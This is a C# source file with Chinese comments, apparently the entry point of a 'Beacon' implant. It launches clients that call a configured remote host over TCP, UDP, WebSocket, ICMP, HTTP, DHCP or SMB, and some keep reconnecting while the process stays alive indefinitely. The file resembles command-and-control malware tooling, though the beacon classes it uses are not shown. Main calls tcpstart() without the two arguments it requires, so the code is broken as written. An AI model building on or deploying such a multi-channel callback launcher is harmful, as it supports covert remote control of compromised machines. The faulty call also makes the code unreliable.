using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Beacon
{
    internal class Program
    {


        static void tcpstart(string ip, int prot)
        {
            var client = new TCPBeacon();
            // 尝试初始连接
            if (client.Connect(ip, prot))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 初始连接成功: {ip}:{prot}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] TCP初始连接失败，将开始重连: {ip}:{prot}");
            }
            // 启动重连循环
            client.StartReconnectLoop();
        }

        static void udpstart()
        {
            var udpclient = new UDPBeacon();
            // 尝试初始连接
            if (udpclient.Start(Settings.Hos_ts, int.Parse(Settings.UDP_Por_ts)))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] UDP 初始连接成功: {Settings.Hos_ts}:{Settings.UDP_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] UDP 初始连接失败");
            }
        }

        static void WebSocketstart()
        {
            var wsclient = new WebSocketBeacon();
            // 尝试初始连接
            if (wsclient.Start($"ws://{Settings.Hos_ts}:{Settings.WS_Por_ts}/ws"))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] WebSocket 初始连接成功: {Settings.Hos_ts}:{Settings.WS_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] WebSocket 初始连接失败");
            }
        }

        static void icmpstart()
        {
            var icmpclient = new ICMPBeacon();
            // 尝试初始连接
            if (icmpclient.Connect(Settings.Hos_ts, int.Parse(Settings.ICMP_Por_ts)))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] ICMP 初始连接成功: {Settings.Hos_ts}:{Settings.ICMP_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] ICMP 初始连接失败，将开始重连: {Settings.Hos_ts}:{Settings.ICMP_Por_ts}");
            }
            // 启动重连循环
            icmpclient.StartReconnectLoop();
        }

        static void httpstart()
        {
            var httpclient = new HttpBeacon();
            // 尝试初始连接
            if (httpclient.Connect(Settings.Hos_ts, int.Parse(Settings.HTTP_Por_ts)))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] HTTP 初始连接成功: {Settings.Hos_ts}:{Settings.HTTP_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] HTTP 初始连接失败");
            }
        }
        static void dhcpstart()
        {
            var dhcpclient = new DHCPBeacon();
            // 尝试初始连接
            if (dhcpclient.Start(Settings.Hos_ts, int.Parse(Settings.DHCP_Por_ts)))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] DHCP 初始连接成功: {Settings.Hos_ts}:{Settings.DHCP_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] DHCP 初始连接失败");
            }
        }
        static void smbstart()
        {
            var smbclient = new SMBBeacon();
            // 尝试初始连接
            if (smbclient.Start(Settings.Hos_ts, int.Parse(Settings.SMB_Por_ts)))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] SMB 初始连接成功: {Settings.Hos_ts}:{Settings.SMB_Por_ts}");
            }
            else
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] SMB 初始连接失败");
            }
        }
        static void Main(string[] args)
        {
            //udpstart();
            tcpstart();
            //WebSocketstart();
            //icmpstart();
            //httpstart();
            //dhcpstart();
            //smbstart();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
    }
}